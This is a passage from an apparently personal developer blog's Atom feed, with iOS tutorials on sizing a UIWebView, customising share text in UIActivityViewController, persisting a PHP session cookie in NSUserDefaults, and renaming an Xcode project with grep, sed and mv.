class="attribute">webView</span> content height <span class="number">187</span>.<span class="number">0</span></span><br><span class="line"><span class="attribute">webview</span> constraint before<span class="meta"> [&lt;NSLayoutConstraint:0x786d49f0 V:[UIWebView:0x786d51e0(30)]&gt;]</span></span><br><span class="line"><span class="attribute">webview</span> constraint after<span class="meta"> [&lt;NSLayoutConstraint:0x786d49f0 V:[UIWebView:0x786d51e0(187)]&gt;]</span></span><br></pre></td></tr></table></figure><p>The <code>UIWebView</code> constraints here has only 1, thus I assumed that the first<br>constraint is the <em>Height</em> constraint, by changing the value of the first<br>constraint, the height of <code>UIWebView</code> will be changed.</p><h2 id="Open-link-by-using-safari-optional"><a href="#Open-link-by-using-safari-optional" class="headerlink" title="Open link by using safari (optional)"></a>Open link by using safari (optional)</h2><p>Now, if you want user to open safari when they click on the link, implement<br>another method</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">func</span> <span class="title function_">webView</span>(<span class="params">webView</span>: <span class="type">UIWebView</span>, <span class="params">shouldStartLoadWithRequest</span> <span class="params">request</span>: <span class="type">NSURLRequest</span>, <span class="params">navigationType</span>: <span class="type">UIWebViewNavigationType</span>) -&gt; <span class="type">Bool</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> navigationType <span class="operator">==</span> .<span class="type">LinkClicked</span> &#123;</span><br><span class="line">        <span class="type">UIApplication</span>.sharedApplication().openURL(request.<span class="type">URL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Completed"><a href="#Completed" class="headerlink" title="Completed"></a>Completed</h2><p>Make sure the <code>UIWebView</code> is inside <code>UIScrollView</code>. As by using auto-layout,<br>the <code>UIScrollView</code> content height will be expand based on its subviews.</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/posts/2015-03-28-show-html-description-in-uiwebview-in-a-better-way/end-result.gif&quot; alt=&quot;Desire result&quot;&gt;&lt;/p&gt;
&lt;p&gt;Let’s</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
    <category term="swift" scheme="http://jslim.net/tags/swift/"/>
    
  </entry>
  
  <entry>
    <title>iOS - UIActivityViewController custom share message to different providers</title>
    <link href="http://jslim.net/blog/2015/01/27/ios-uiactivityviewcontroller-custom-share-message-to-different-providers/"/>
    <id>http://jslim.net/blog/2015/01/27/ios-uiactivityviewcontroller-custom-share-message-to-different-providers/</id>
    <published>2015-01-27T21:17:43.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>Begin from iOS6, Apple simplify the share process by using <code>UIActivityViewController</code>.<br>The thing is that, Twitter is only allow up to <code>140</code> characters on a post,<br>thus we may need to customize the share text for Twitter.</p><p>One of the way is to subclass the <code>UIActivityItemProvider</code>. Here is<br>how you can do it:</p><p><strong>MyActivityItemProvider.h</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#import <span class="string">&lt;UIKit/UIKit.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">MyActivityItemProvider</span> : <span class="title">UIActivityItemProvider</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">@end</span></span><br></pre></td></tr></table></figure><p><strong>MyActivityItemProvider.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#import <span class="string">&quot;MyActivityItemProvider.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">MyActivityItemProvider</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1.</span></span><br><span class="line">- (<span class="type">id</span>)activityViewController:(<span class="built_in">UIActivityViewController</span> *)activityViewController itemForActivityType:(<span class="built_in">NSString</span> *)activityType</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 2.</span></span><br><span class="line">    <span class="keyword">if</span> ([activityType isEqualToString:<span class="built_in">UIActivityTypePostToFacebook</span>]) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">@&quot;Facebook: testing 123&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ([activityType isEqualToString:<span class="built_in">UIActivityTypePostToTwitter</span>]) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">@&quot;Twitter: testing 123&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">@&quot;No provider&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@end</span></span><br></pre></td></tr></table></figure><p><strong>MyViewController.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3.</span></span><br><span class="line">MyActivityItemProvider *message = [[MyActivityItemProvider alloc] init];</span><br><span class="line"></span><br><span class="line"><span class="built_in">NSArray</span> *activityItems;</span><br><span class="line"><span class="keyword">if</span> (myImage != <span class="literal">nil</span>) &#123;</span><br><span class="line">    activityItems = @[message, myImage];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    activityItems = @[message];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">UIActivityViewController</span> *activityController = [[<span class="built_in">UIActivityViewController</span> alloc] initWithActivityItems:activityItems applicationActivities:<span class="literal">nil</span>];</span><br><span class="line">[<span class="keyword">self</span> presentViewController:activityController animated:<span class="literal">YES</span> completion:<span class="literal">nil</span>];</span><br></pre></td></tr></table></figure><ol><li>Override <code>activityViewController:itemForActivityType:</code>.</li><li>Customize message for each provider if you want to.</li><li>Just treat it as a message, assign it together with image <em>(if you have one)</em>. The <code>UIActivityViewController</code> will then pick the correct message for corresponding provider.</li></ol>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Begin from iOS6, Apple simplify the share process by using &lt;code&gt;UIActivityViewController&lt;/code&gt;.&lt;br&gt;The thing is that, Twitter is only</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
    <category term="objective-c" scheme="http://jslim.net/tags/objective-c/"/>
    
  </entry>
  
  <entry>
    <title>Handling login session in iOS &amp;amp; server</title>
    <link href="http://jslim.net/blog/2015/01/27/handling-login-session-in-ios-and-server/"/>
    <id>http://jslim.net/blog/2015/01/27/handling-login-session-in-ios-and-server/</id>
    <published>2015-01-27T17:54:55.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>When comes to server &amp; client side integration, there are many<br>ways to handle the login session. Some people might keep the<br>login user ID or token in <code>NSUserDefaults</code>, some are to keep<br>the login session cookie. There is no right or wrong.</p><p>I’m here to share about session cookie way.</p><h3 id="In-server-side-e-g-PHP"><a href="#In-server-side-e-g-PHP" class="headerlink" title="In server side (e.g. PHP)"></a>In server side (e.g. PHP)</h3><p>Let say once user successfully login, the server will then keep<br>the login user into session.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(&lt;correct credential&gt;) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;curr_user&#x27;</span>] = ...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="In-Objective-C-client-side"><a href="#In-Objective-C-client-side" class="headerlink" title="In Objective-C (client-side)"></a>In Objective-C (client-side)</h3><p>What about in client side?</p><p><strong>AppDelegate.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.</span></span><br><span class="line"><span class="keyword">static</span> <span class="built_in">NSString</span> *kServerSessionCookie = <span class="string">@&quot;PHPSESSID&quot;</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="built_in">NSString</span> *kLocalCookieName = <span class="string">@&quot;MyProjectCookie&quot;</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="built_in">NSString</span> *kLocalUserData = <span class="string">@&quot;MyProjectLocalUser&quot;</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="built_in">NSString</span> *kBaseUrl = <span class="string">@&quot;http://api.example.com&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">- (<span class="type">BOOL</span>)application:(<span class="built_in">UIApplication</span> *)application didFinishLaunchingWithOptions:(<span class="built_in">NSDictionary</span> *)launchOptions</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2.</span></span><br><span class="line">    [<span class="keyword">self</span> updateSession];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ([<span class="keyword">self</span> isLoggedIn]) &#123;</span><br><span class="line">        <span class="comment">// action if currently logged in</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// action if currently not logged in</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.</span></span><br><span class="line">- (<span class="type">void</span>)saveLoginSession</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">NSUserDefaults</span> *defaults = [<span class="built_in">NSUserDefaults</span> standardUserDefaults];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">NSArray</span> *allCookies = [[<span class="built_in">NSHTTPCookieStorage</span> sharedHTTPCookieStorage] cookiesForURL:[<span class="built_in">NSURL</span> URLWithString:kBaseUrl]];</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">NSHTTPCookie</span> *cookie <span class="keyword">in</span> allCookies) &#123;</span><br><span class="line">        <span class="keyword">if</span> ([cookie.name isEqualToString:kServerSessionCookie]) &#123;</span><br><span class="line">            <span class="built_in">NSMutableDictionary</span>* cookieDictionary = [<span class="built_in">NSMutableDictionary</span> dictionaryWithDictionary:[defaults dictionaryForKey:kLocalCookieName]];</span><br><span class="line">            [cookieDictionary setValue:cookie.properties forKey:kBaseUrl];</span><br><span class="line">            [defaults setObject:cookieDictionary forKey:kLocalCookieName];</span><br><span class="line">            [defaults synchronize];</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4.</span></span><br><span class="line">- (<span class="type">void</span>)removeLoginSession</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">NSUserDefaults</span> *defaults = [<span class="built_in">NSUserDefaults</span> standardUserDefaults];</span><br><span class="line">    [defaults removeObjectForKey:kLocalCookieName];</span><br><span class="line">    [defaults synchronize];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.</span></span><br><span class="line">- (<span class="type">void</span>)updateSession</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">NSUserDefaults</span> *defaults = [<span class="built_in">NSUserDefaults</span> standardUserDefaults];</span><br><span class="line">    <span class="built_in">NSDictionary</span> *cookieDict = [defaults dictionaryForKey:kLocalCookieName];</span><br><span class="line">    <span class="built_in">NSDictionary</span> *cookieProperties = [cookieDict valueForKey:kBaseUrl];</span><br><span class="line">    <span class="keyword">if</span> (cookieProperties != <span class="literal">nil</span>) &#123;</span><br><span class="line">        <span class="built_in">NSHTTPCookie</span> *cookie = [<span class="built_in">NSHTTPCookie</span> cookieWithProperties:cookieProperties];</span><br><span class="line">        <span class="built_in">NSArray</span> *cookies = [<span class="built_in">NSArray</span> arrayWithObject:cookie];</span><br><span class="line">        [[<span class="built_in">NSHTTPCookieStorage</span> sharedHTTPCookieStorage] setCookies:cookies forURL:[<span class="built_in">NSURL</span> URLWithString:kBaseUrl] mainDocumentURL:<span class="literal">nil</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="type">BOOL</span>)isLoggedIn</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> [[<span class="built_in">NSUserDefaults</span> standardUserDefaults] objectForKey:kLocalCookieName] != <span class="literal">nil</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>Keep those <em>key</em> as constants. By default, PHP session cookie name is <code>PHPSESSID</code>, if you’re using other framework, the key might be changed.</li><li>Once user logon, the session cookie will be kept at client-side, without the cookie, the server will not know that the user is currently logged in. Thus sync it when first enter the app.</li><li>Upon successful login, keep the session data to <code>NSUserDefaults</code>, we can then check whether the session is exists before call any server API.</li><li>Once logged out, remember to remove the session.</li><li>Sync the session cookie kept in <code>NSUserDefaults</code> into cookie storage.</li></ol>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;When comes to server &amp;amp; client side integration, there are many&lt;br&gt;ways to handle the login session. Some people might keep</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>How to rename Xcode project thoroughly</title>
    <link href="http://jslim.net/blog/2015/01/07/how-to-rename-xcode-project-thoroughly/"/>
    <id>http://jslim.net/blog/2015/01/07/how-to-rename-xcode-project-thoroughly/</id>
    <published>2015-01-07T17:21:39.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>I’m doing with lot of projects, some projects are similar, thus I can just clone from the<br>existing project and rename it. But how to rename it <em>completely</em>?</p><h2 id="1-Change-the-project-name-in-Xcode"><a href="#1-Change-the-project-name-in-Xcode" class="headerlink" title="1. Change the project name in Xcode"></a>1. Change the project name in Xcode</h2><p><img src="/images/posts/2015-01-08-how-to-rename-xcode-project-thoroughly/original.png" alt="Original name"></p><p>Click on the project, at the right pane, update the name to the name that you want,<br>then hit <strong><code>&lt;Enter&gt;</code></strong></p><p><img src="/images/posts/2015-01-08-how-to-rename-xcode-project-thoroughly/confirm-rename.png" alt="Rename confirmation"></p><p>Then it will prompt you which one to rename, just check all and hit <strong><code>&lt;Enter&gt;</code></strong></p><h2 id="2-Rename-scheme"><a href="#2-Rename-scheme" class="headerlink" title="2. Rename scheme"></a>2. Rename scheme</h2><p><img src="/images/posts/2015-01-08-how-to-rename-xcode-project-thoroughly/rename-scheme.png" alt="Rename scheme"></p><p>Click the scheme up there, then <strong>Manage schemes…</strong></p><p><img src="/images/posts/2015-01-08-how-to-rename-xcode-project-thoroughly/change-scheme-name.png" alt="Change scheme name"></p><p>Then change the scheme name <em>(click on that row, then hit <strong><code>&lt;Enter&gt;</code></strong>)</em></p><h2 id="3-Rename-in-Terminal"><a href="#3-Rename-in-Terminal" class="headerlink" title="3. Rename in Terminal"></a>3. Rename in Terminal</h2><p>Close the Xcode first.</p><p>Then try to search for your project name</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ cd /path/<span class="keyword">to</span>/JsFoo/</span><br><span class="line">$ grep -R <span class="string">&quot;JsFoo&quot;</span><span class="operator"> *</span></span><br><span class="line"><span class="operator"></span><span class="module-access"><span class="module"><span class="identifier">JsBar</span>.</span></span>xcodeproj/project.pbxproj:        <span class="number">4</span>B5454051A5E0E0200FD515D <span class="comment">/* JsFooTests.swift in Sources */</span> = &#123;isa = PBXBuildFile; fileRef = <span class="number">4</span>B5454041A5E0E0200FD515D <span class="comment">/* JsFooTests.swift */</span>; &#125;;</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">JsBar</span>.</span></span>xcodeproj/project.pbxproj:            remoteInfo = JsFoo;</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">JsBar</span>.</span></span>xcodeproj/project.pbxproj:        <span class="number">4</span>B5454041A5E0E0200FD515D <span class="comment">/* JsFooTests.swift */</span> = &#123;isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = <span class="module-access"><span class="module"><span class="identifier">JsFooTests</span>.</span></span>swift; sourceTree = <span class="string">&quot;&lt;group&gt;&quot;</span>; &#125;;</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">JsBar</span>.</span></span>xcodeproj/project.pbxproj:                <span class="number">4</span>B5453EB1A5E0E0200FD515D <span class="comment">/* JsFoo */</span>,</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">JsBar</span>.</span></span>xcodeproj/project.pbxproj:                <span class="number">4</span>B5454011A5E0E0200FD515D <span class="comment">/* JsFooTests */</span>,</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">JsBar</span>.</span></span>xcodeproj/project.pbxproj:        <span class="number">4</span>B5453EB1A5E0E0200FD515D <span class="comment">/* JsFoo */</span> = &#123;</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">JsBar</span>.</span></span>xcodeproj/project.pbxproj:            path = JsFoo;</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">JsBar</span>.</span></span>xcodeproj/project.pbxproj:        <span class="number">4</span>B5454011A5E0E0200FD515D <span class="comment">/* JsFooTests */</span> = &#123;</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">JsBar</span>.</span></span>xcodeproj/project.pbxproj:                <span class="number">4</span>B5454041A5E0E0200FD515D <span class="comment">/* JsFooTests.swift */</span>,</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">JsBar</span>.</span></span>xcodeproj/project.pbxproj:            path = JsFooTests;</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">JsBar</span>.</span></span>xcodeproj/project.pbxproj:            productName = JsFoo;</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">JsBar</span>.</span></span>xcodeproj/project.pbxproj:            productName = JsFooTests;</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">JsBar</span>.</span></span>xcodeproj/project.pbxproj:                <span class="number">4</span>B5454051A5E0E0200FD515D <span class="comment">/* JsFooTests.swift in Sources */</span>,</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">JsBar</span>.</span></span>xcodeproj/project.pbxproj:                INFOPLIST_FILE = JsFoo/<span class="module-access"><span class="module"><span class="identifier">Info</span>.</span></span>plist;</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">JsBar</span>.</span></span>xcodeproj/project.pbxproj:                INFOPLIST_FILE = JsFoo/<span class="module-access"><span class="module"><span class="identifier">Info</span>.</span></span>plist;</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">JsBar</span>.</span></span>xcodeproj/project.pbxproj:                INFOPLIST_FILE = JsFooTests/<span class="module-access"><span class="module"><span class="identifier">Info</span>.</span></span>plist;</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">JsBar</span>.</span></span>xcodeproj/project.pbxproj:                TEST_HOST = <span class="string">&quot;$(BUILT_PRODUCTS_DIR)/JsFoo.app/JsFoo&quot;</span>;</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">JsBar</span>.</span></span>xcodeproj/project.pbxproj:                INFOPLIST_FILE = JsFooTests/<span class="module-access"><span class="module"><span class="identifier">Info</span>.</span></span>plist;</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">JsBar</span>.</span></span>xcodeproj/project.pbxproj:                TEST_HOST = <span class="string">&quot;$(BUILT_PRODUCTS_DIR)/JsFoo.app/JsFoo&quot;</span>;</span><br><span class="line">Binary file <span class="module-access"><span class="module"><span class="identifier">JsBar</span>.</span></span>xcodeproj/project.xcworkspace/xcuserdata/js.xcuserdatad/<span class="module-access"><span class="module"><span class="identifier">UserInterfaceState</span>.</span></span>xcuserstate matches</span><br><span class="line">JsFoo/<span class="module-access"><span class="module"><span class="identifier">AppDelegate</span>.</span></span>swift:<span class="comment">//  JsFoo</span></span><br><span class="line">JsFoo/<span class="module-access"><span class="module"><span class="identifier">ViewController</span>.</span></span>swift:<span class="comment">//  JsFoo</span></span><br><span class="line">JsFooTests/<span class="module-access"><span class="module"><span class="identifier">JsFooTests</span>.</span></span>swift:<span class="comment">//  JsFooTests.swift</span></span><br><span class="line">JsFooTests/<span class="module-access"><span class="module"><span class="identifier">JsFooTests</span>.</span></span>swift:<span class="comment">//  JsFooTests</span></span><br><span class="line">JsFooTests/<span class="module-access"><span class="module"><span class="identifier">JsFooTests</span>.</span></span>swift:<span class="keyword">class</span> JsFooTests: XCTestCase &#123;</span><br></pre></td></tr></table></figure><p>It seems a lot to change… No worry, there is an easy way to do it</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span> grep -Rl <span class="string">&quot;JsFoo&quot;</span> * | xargs sed -i <span class="string">&quot;&quot;</span> <span class="string">&quot;s/JsFoo/JsBar/&quot;</span></span><br><span class="line">sed: <span class="keyword">Binary</span>: <span class="keyword">No</span> such <span class="keyword">file</span> <span class="keyword">or</span> directory</span><br></pre></td></tr></table></figure><p><code>grep</code> to search for “JsFoo”, and the <code>-l</code> option is to show the file name only,<br>then only pass the result to <code>sed</code> to change “JsFoo” to “JsBar”</p><p>Try to search again…</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ grep -R <span class="string">&quot;JsFoo&quot;</span> *</span><br><span class="line"><span class="keyword">Binary </span>file <span class="keyword">JsBar.xcodeproj/project.xcworkspace/xcuserdata/js.xcuserdatad/UserInterfaceState.xcuserstate </span>matches</span><br><span class="line"><span class="keyword">JsFoo/AppDelegate.swift:// </span> <span class="keyword">JsFoo</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">JsFoo/ViewController.swift:// </span> <span class="keyword">JsFoo</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">JsFooTests/JsFooTests.swift:// </span> <span class="keyword">JsFooTests.swift</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">JsFooTests/JsFooTests.swift:// </span> <span class="keyword">JsFooTests</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">JsFooTests/JsFooTests.swift:class </span><span class="keyword">JsFooTests: </span>XCTestCase &#123;</span><br></pre></td></tr></table></figure><p>Oops… Some files haven’t change. The reason for this is because one of the file is actually<br>a binary file, up until there the instruction is break. Let’s do again and exclude that binary<br>file</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ grep -Rl <span class="string">&quot;JsFoo&quot;</span> JsFoo*<span class="regexp">/* | xargs sed -i &quot;&quot; &quot;s/</span>JsFoo<span class="regexp">/JsBar/</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure><p>Search again?</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">grep</span> -R <span class="string">&quot;JsFoo&quot;</span> *</span><br><span class="line">Binary <span class="keyword">file</span> JsBar.xcodeproj<span class="regexp">/project.xcworkspace/</span>xcuserdata<span class="regexp">/js.xcuserdatad/U</span>serInterfaceState.xcuserstate matches</span><br></pre></td></tr></table></figure><p>Done! Now totally no more “JsFoo”. One more thing, rename the folders</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> <span class="built_in">mv</span> JsFoo JsBar</span><br><span class="line"><span class="variable">$</span> <span class="built_in">mv</span> JsFooTests JsBarTests</span><br></pre></td></tr></table></figure><p>Now you can open up your Xcode project, and build it</p><p><img src="/images/posts/2015-01-08-how-to-rename-xcode-project-thoroughly/build-error.png" alt="Build error"></p><p>Oops… Got error?</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&lt;unknown&gt;</span><span class="number">0</span>: error: <span class="keyword">no</span> such <span class="keyword">file</span> <span class="built_in">or</span> directory: <span class="string">&#x27;.../JsBarTests/JsBarTests.swift&#x27;</span></span><br></pre></td></tr></table></figure><p>One more file that we forgot to rename</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mv JsBarTests<span class="regexp">/JsFooTests.swift JsBarTests/</span>JsBarTests.swift</span><br></pre></td></tr></table></figure><p><img src="/images/posts/2015-01-08-how-to-rename-xcode-project-thoroughly/rename-success.png" alt="Successful rename"></p><p>Done!!!</p><h2 id="Update-2015-05-06"><a href="#Update-2015-05-06" class="headerlink" title="Update: 2015-05-06"></a>Update: 2015-05-06</h2><p>Xcode 6.3.1 will crash during the rename.<br>And I found a simpler way on doing that, <a href="https://stackoverflow.com/questions/29824737/xcode-6-3-1-crashes-while-renaming-project/29830195#29830195">refer here</a></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># install the necessary package</span></span><br><span class="line"><span class="variable">$ </span>brew install rename ack</span><br><span class="line"></span><br><span class="line"><span class="comment"># run this for a couple of times</span></span><br><span class="line"><span class="variable">$ </span>find . -name <span class="string">&#x27;JsFoo*&#x27;</span> -print0 | xargs <span class="number">-0</span> rename -S <span class="string">&#x27;JsFoo&#x27;</span> <span class="string">&#x27;JsBar&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$ </span>ack --literal --files-<span class="keyword">with</span>-matches <span class="string">&#x27;JsFoo&#x27;</span> | xargs sed -i <span class="string">&#x27;&#x27;</span> <span class="string">&#x27;s/JsFoo/JsBar/g&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># double confirm, if no output, that means success</span></span><br><span class="line"><span class="variable">$ </span>ack --literal <span class="string">&#x27;JsFoo&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
